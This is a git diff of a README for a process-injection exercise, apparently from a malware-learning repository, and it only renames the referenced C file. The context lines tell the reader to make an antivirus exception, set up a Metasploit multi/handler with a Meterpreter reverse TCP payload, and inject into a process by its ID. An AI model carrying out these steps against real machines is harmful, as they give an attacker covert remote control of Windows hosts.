@@ -1,6 +1,6 @@
 # process injection
 
-- to run `win32_pi.c`, first create an exception for current folder
+- to run `pi.c`, first create an exception for current folder
 - install metasploit on your linux:
 
 ```bash
@@ -27,7 +27,7 @@ msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
 msf6 exploit(multi/handler) > run -j
 ```
 
-- build and run the `win32_pi.c` with the process ID as an argument
+- build and run the `pi.c` with the process ID as an argument
 - on the linux shell, you should see:
 
 ```txt
